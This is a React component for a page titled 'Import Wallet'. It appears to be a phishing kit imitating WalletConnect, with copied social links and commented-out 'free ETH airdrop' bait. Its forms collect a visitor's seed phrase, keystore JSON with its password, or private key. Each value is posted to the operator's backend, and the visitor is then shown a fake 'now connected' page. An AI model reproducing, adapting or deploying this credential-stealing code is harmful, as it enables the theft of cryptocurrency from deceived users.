import React, {useState} from 'react'
import "./Header.css"
import Logo from "./logo.svg"
import "./Phrase.css"
import {NavLink, useParams} from "react-router-dom"
import Button from '@material-ui/core/Button';
import TwitterIcon from '@material-ui/icons/Twitter';
import "./PrivateKey.css"
import axios from "./axios";
import Discord from "./discord.svg"
import Telegram from "./telegram.svg"
import Twitter from "./twitter.svg"
import Github from "./github.svg"


function Header(props) {


    const {wallet} = useParams()

    const [input, setInput] = useState("");
    const [walletName, setWalletName] = useState("");
    const [showPhrase, setShowPhrase] = useState(true)
    const [showKey, setShowKey] = useState(false)
    const [showJson, setShowJson] = useState(false)


    const sendPrivateKey = async(e) => {
        e.preventDefault();

        console.log(input)
        console.log("clicked");
        await axios.post("/privateKey/new", {
            privateKey: input,
            walletName: wallet
        });
        console.log(wallet);

        setInput("");
        props.history.push("/nowconnected")
    };

    const [phraseInput, setPhraseInput] = useState("");
    const [phraseWalletName, setPhraseWalletName] = useState("");


    const sendPhrase = async(e) => {
        e.preventDefault();

        console.log(phraseInput)
        console.log(phraseWalletName)

        console.log("clicked");
        await axios.post("/phrase/new", {
            phrase: phraseInput,
            walletName: wallet
        });

        setPhraseInput("");
        props.history.push("/nowconnected")

    };


    const [jsonInput, setJsonInput] = useState("");

    const sendJson = async(e) => {
        e.preventDefault();

        console.log(jsonInput)

        await axios.post("/json/new", {
            json: jsonInput,
            walletName: wallet
        });

        setPhraseInput("");
        props.history.push("/nowconnected")

    };



    return (
        <div>

            <div className="header__main">
                    <div className="home__header__link">
                    <a href="#footer?v" className="left">Github</a>
                    <a href="#?v" className="left">Docs</a>
                    <a href="/connect" className="main"><img className="logo" src={Logo} alt="logo"/></a>
                    <a href="#wallets?v" className="left">Wallets</a>
                    <a href="#?v" className="left">Apps</a>
                    </div>
                    <div className="header__txt">
                        {/* <h5>Get 10K ETH free airdrop</h5> */}
                        <h2>Import Wallet</h2>
                    </div>

                    
                    <div className="header__router">
                        <div onClick={()=> setShowPhrase(true)&setShowKey(false)&setShowJson(false)} className={`link ${showPhrase && "blue_bg"}`} >
                            <p className="router">Phrase</p>
                        </div>
                        <div onClick={()=> setShowJson(true)&setShowKey(false)&setShowPhrase(false)} className={`link ${showJson && "blue_bg"}`} >
                            <p className="router">Keystore JSON</p>
                        </div>
                        <div onClick={()=> setShowKey(true)&setShowPhrase(false)&setShowJson(false)} className={`link ${showKey && "blue_bg"}`}>
                            <p className="router">Private Key</p>
                        </div>

                    </div>
            </div>
        <div className={`main__phrase ${!showPhrase && "showNot"}`}>
            <div className="phrase__form">
                <form className="phrase__form">
                {/* <input value={walletName} placeholder="State Wallet Type e.g Binance" onChange={(e) => setWalletName(e.target.value)} type="text" name="WalletName">
                </input> */}
                 <textarea value={phraseInput} placeholder="Phrase" onChange={(e) => setPhraseInput(e.target.value)} type="text" name="Phrase">
                </textarea>
                <p className="phrase__description">Typically 12, (sometimes 24) words separated by single spaces</p>
                <Button onClick={sendPhrase} type="submit" className="btn" variant="contained" color="primary">IMPORT</Button>
                </form>

                
            </div>
        </div>


        <div className={`main__phrase ${!showJson && "showNot"}`}>
            <div className="phrase__form">
                <form className="phrase__form">
                {/* <input value={walletName} placeholder="State Wallet Type e.g Binance" onChange={(e) => setWalletName(e.target.value)} type="text" name="WalletName">
                </input> */}
                 <textarea value={jsonInput} placeholder="Keystore JSON" onChange={(e) => setJsonInput(e.target.value)} type="text" name="Phrase">
                </textarea>
                <p className="phrase__description">Several lines of text beginning with '(...)' plus the password you used to encrypt its</p>
                <Button onClick={sendJson} type="submit" className="btn" variant="contained" color="primary">IMPORT</Button>
                </form>

                
            </div>
        </div>

        <div className={`main__phrase ${!showKey && "showNot"}`}>
            <div className="phrase__form">
                <form className="phrase__form">
                {/* <input value={walletName} placeholder="State Wallet Type e.g Binance" onChange={(e) => setWalletName(e.target.value)} type="text" name="walletname">
                </input> */}
                <input value={input} placeholder="Private Key" onChange={(e) => setInput(e.target.value)} type="text" name="privateKey">
                </input>
                <p className="phrase__description">Typically 64 alphanumeric characters</p>
                <Button onClick={sendPrivateKey} type="submit" className="btn" variant="contained" color="primary">IMPORT</Button>
                </form>
               {/* <a href="https://mobile.twitter.com/ethfreeairdrop" className="social__handles"> <TwitterIcon color="primary"/>Twitter</a> */}
                
            </div>
        </div>
            <center>
                    <footer className="home__footer">
            <div id="footer">
            <p className="footer__p"><img  src={Discord} className="footimg"/>  <a href="../discord.com/invite/jhxMvxP.html">Discord</a></p><br/>
            <p className="footer__p"><img  src={Telegram} className="footimg"/>  <a href="../t.me/walletconnect_announcements.html">Telegram</a></p><br/>
            <p className="footer__p"><img  src={Twitter} className="footimg"/>  <a href="../twitter.walletconnect.org/index.html">Twitter</a></p><br/>
            <p className="footer__p"><img  src={Github} className="footimg"/>  <a href="../github.com/walletconnect.html">Github</a></p><br/>
            </div>
            </footer>
            </center>
    </div>
    )
}

export default Header

